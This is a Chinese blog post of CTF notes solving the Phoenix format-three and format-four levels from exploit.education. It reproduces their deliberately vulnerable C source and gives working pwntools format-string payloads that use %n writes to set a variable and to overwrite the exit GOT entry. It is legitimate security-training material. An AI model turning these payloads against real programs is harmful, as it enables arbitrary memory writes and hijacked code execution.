---
title: "[pwn笔记5]format-three，format-four(phoenix)"
date: 2023-07-17 17:18:56
urlname: "pwn5"
tags: [pwn, format]
---

这两道似乎没有x86_64的解法。

## format-three

```c
/*
 * phoenix/format-three, by https://exploit.education
 *
 * Can you change the "changeme" variable to a precise value?
 *
 * How do you fix a cracked pumpkin? With a pumpkin patch.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int changeme;

void bounce(char *str) {
  printf(str);
}

int main(int argc, char **argv) {
  char buf[4096];
  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);

  if (changeme == 0x64457845) {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  } else {
    printf(
        "Better luck next time - got 0x%08x, wanted 0x64457845!\n", changeme);
  }

  exit(0);
}
```

用%n，每次修改一个字节，由于输出长度是递增的，所以第一次输出到0x145字节，第二次输出到0x178以此类推。

为什么第一次不是0x45字节呢？因为我们要先消耗掉栈上的10个东东，才轮到我们输入的开头，即%n的目标。

注意这是python2（下同）

```python
from pwn import *
p = process("/opt/phoenix/i486/format-three")
p.sendline("\x44\x98\x04\x08\x45\x98\x04\x08\x46\x98\x04\x08\x47\x98\x04\x08"+"A"*(0x145-99-4*4)+"%08x "*11+"%n"+"a"*((0x178-0x145))+"%n"+"a"*(0x245-0x178)+"%n"+"a"*(0x264-0x245)+"%n")
p.interactive()
```

## format-four

```c
/*
 * phoenix/format-four, by https://exploit.education
 *
 * Can you affect code execution? Once you've got congratulations() to
 * execute, can you then execute your own shell code?
 *
 * Did you get a hair cut?
 * No, I got all of them cut.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

void bounce(char *str) {
  printf(str);
  exit(0);
}

void congratulations() {
  printf("Well done, you're redirected code execution!\n");
  exit(0);
}

int main(int argc, char **argv) {
  char buf[4096];

  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);
}
```

往got表上写入，覆盖exit的地址。（研究了半天怎么改返回地址，结果。。。）

会导致程序退不出，死循环。

```python
payload="\xe4\x97\x04\x08\xe5\x97\x04\x08\xe6\x97\x04\x08\xe7\x97\x04\x08"+"A"*(0x103-99-4*4)+"%08x "*11+"%n"+"a"*((0x185-0x103))+"%n"+"a"*(0x204-0x185)+"%n"+"a"*(0x208-0x204)+"%n"
open("/home/user/buf","wb").write(payload)
```

